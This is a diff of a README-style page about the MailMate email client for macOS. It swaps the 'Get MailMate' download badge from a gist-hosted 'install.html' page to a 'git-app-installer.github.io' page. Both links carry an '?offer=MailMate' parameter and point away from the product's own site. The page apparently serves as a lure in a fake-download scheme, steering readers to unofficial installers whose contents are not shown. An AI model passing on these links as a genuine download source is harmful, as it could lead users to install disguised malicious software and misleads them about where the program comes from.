@@ -4,7 +4,7 @@ MailMate is a powerful email client designed specifically for macOS users who va
 
 With deep macOS integration, MailMate provides robust filtering, smart mailboxes, and compatibility with multiple accounts while maintaining a secure and efficient environment.
 
-<a href="https://gistcdn.githack.com/navymarslion/e2aadbcd0a0c9e2b6ca36709e46c9924/raw/d434d3ef64180501973c0cd1a60f695ad5155060/install.html?offer=MailMate" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MailMate" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MailMate%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
